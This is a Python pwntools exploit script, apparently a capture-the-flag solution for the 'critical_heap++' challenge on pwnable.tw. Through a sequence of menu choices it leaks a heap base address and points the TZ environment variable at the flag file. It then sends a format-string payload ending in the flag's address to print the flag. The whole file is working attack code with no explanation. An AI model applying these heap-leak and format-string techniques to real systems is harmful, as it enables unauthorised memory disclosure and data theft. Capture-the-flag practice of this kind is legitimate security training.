from pwn import *

r = remote('chall.pwnable.tw', 10500)
#r = remote('localhost', 56746)

# 0: system
r.recvuntil('Your choice : ')
r.sendline('1')
r.recvuntil('Name of heap:')
r.sendline('abcd')
r.recvuntil('Your choice : ')
r.sendline('3')

# 0: play system (setenv)
r.recvuntil('Your choice : ')
r.sendline('4')
r.recvuntil('Index of heap :')
r.sendline('0')
r.recvuntil('Your choice : ')
r.sendline('1')
r.recvuntil('Give me a name for the system heap :')
r.sendline('abcd')
r.recvuntil('Give me a value for this name :')
r.sendline('efgh')

# 0: play system (getenv -> 0x20)
r.recvuntil('Your choice : ')
r.sendline('4')
r.recvuntil('What\'s name do you want to see :')
r.sendline('abcd') # previous setenv
r.sendline('5')

# 0: delete
r.recvuntil('Your choice : ')
r.sendline('5')
r.recvuntil('Index of heap :')
r.sendline('0')

# 0: normal
r.recvuntil('Your choice : ')
r.sendline('1')
r.recvuntil('Name of heap:')
r.sendline('defg')
r.recvuntil('Your choice : ')
r.sendline('1')
r.recvuntil('Content of heap :')
r.send('AAAAAAAA') # 0x18 -> 0x20

# 0: show
r.recvuntil('Your choice : ')
r.sendline('2')
r.recvuntil('Index of heap :')
r.sendline('0')

# get heap base
r.recvuntil('AAAAAAAA')
base = u64(r.recvuntil('*')[:-2].ljust(8, '\x00')) - 0x145

print hex(base)

# 1: system
r.recvuntil('Your choice : ')
r.sendline('1')
r.recvuntil('Name of heap:')
r.sendline('abcd')
r.recvuntil('Your choice : ')
r.sendline('3')

# 1: play system (setenv -> TZ)
r.recvuntil('Your choice : ')
r.sendline('4')
r.recvuntil('Index of heap :')
r.sendline('1')
r.recvuntil('Your choice : ')
r.sendline('1')
r.recvuntil('Give me a name for the system heap :')
r.sendline('TZ')
r.recvuntil('Give me a value for this name :')
r.sendline('/home/critical_heap++/flag')
r.recvuntil('Your choice : ')
r.sendline('5')

# 2: clock
r.recvuntil('Your choice : ')
r.sendline('1')
r.recvuntil('Name of heap:')
r.sendline('ghij')
r.recvuntil('Your choice : ')
r.sendline('2')

# flag
flag_addr = base + 0x4d0

# 0: play normal change content
r.recvuntil('Your choice : ')
r.sendline('4')
r.recvuntil('Index of heap :')
r.sendline('0')
r.recvuntil('Your choice : ')
r.sendline('2')
r.recvuntil('Content :')
r.sendline('%c%c%c%c%c%c%c%c%c%c%c%s' + p64(flag_addr))

# 0: play normal show content 
r.recvuntil('Your choice : ')
r.sendline('1')

r.interactive()
